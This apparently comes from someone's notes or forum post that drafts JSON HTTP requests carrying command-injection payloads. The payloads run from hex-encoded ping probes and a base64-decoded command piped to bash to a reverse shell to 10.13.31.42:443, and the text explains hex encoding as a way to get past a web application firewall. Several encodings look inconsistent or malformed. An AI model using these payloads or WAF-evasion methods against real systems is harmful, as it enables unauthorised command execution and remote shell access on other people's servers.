POST /submit HTTP/1.1

Host: example.com

Content-Type: application/json

{

"field1": "value1",

"field2": "uname -a\x3b\x70\x69\x6e\x67\x20\x2d\x63\x20\x32\x20\x31\x30\x2e\x31\x33\x2e\x33\x31\x2e\x34\x32\x3b",

"field3": "value3"

}

=========

POST /example/json

HTTP/1.1 Host: example.com

Content-Type: application/json

{ "param1": "value1", "param2": "value2", "param3": "3b70696e67202d63322031302e31332e33312e34323b" }

=========

You can use Burp Suite to send a request with a payload of "\;ping -c 2 10.13.31.42;", encoded in hexadecimal, to test for a command injection vulnerability. Here is an example request and payload:

POST /example/json HTTP/1.1 Host: example.com Content-Type: application/json

{ "param1": "value1", "param2": "value2", "param3": "5c3b70696e67202d63322031302e31332e33312e34323b" }

The payload, "5c3b70696e67202d63322031302e31332e33312e34323b" is the hexadecimal representation of "\;ping -c 2 10.13.31.42;". Escaping the payload can be useful in this context if the application is using a web application firewall (WAF) that is configured to block requests containing special characters. By escaping the payload, the request might be able to bypass the WAF and the command injection vulnerability might be exploitable

======

POST /example/json HTTP/1.1

Host: example.com

Content-Type: application/json

`{`

`"param1": "value1",`

`"param2": "value2",`

`"param3": "\"3b70696e67202d63322031302e31332e33312e34323b\""`

`}`

======

### Thoughts on this payload? Json post request to get command injeciton. Hex to potentially get around waf. Would it be good, or is there something wrong or even inefficient in it?

POST /example/json HTTP/1.1

Host: uwu.com

Content-Type: application/json

`{`

`"target":"\";echo cGluZyAtYzIgMTAuMTMuNC4y | base64 -d | bash; \""`

`}`

==========

### Thoughts on this payload? Json post request to get command injeciton. Hexadecimal to potentially get around waf. Would it be good, or is there something wrong or even inefficient in it?

POST /example/json HTTP/1.1

Host: uwu.com

Content-Type: application/json

`{`
`"target": "\";bash -c bash -i >& /dev/tcp/10.13.31.42/443 0>&1; \""`
`}`

==
### Thoughts on this payload? Json post request to get command injeciton. Hexadecimal to potentially get around waf. Would it be good, or is there something wrong or even inefficient in it?

POST /example/json HTTP/1.1

Host: uwu.com

Content-Type: application/json

`{`
`"target":"\"0x3b0x620x610x730x680x200x2d0x630x200x620x610x730x680x200x2d0x690x200x3e0x260x200x2f0x640x650x760x2f0x740x630x700x2f0x310x300x2e0x310x330x2e0x330x310x2e0x340x320x2f0x340x340x330x200x300x3e0x260x310x3b \""`
`}`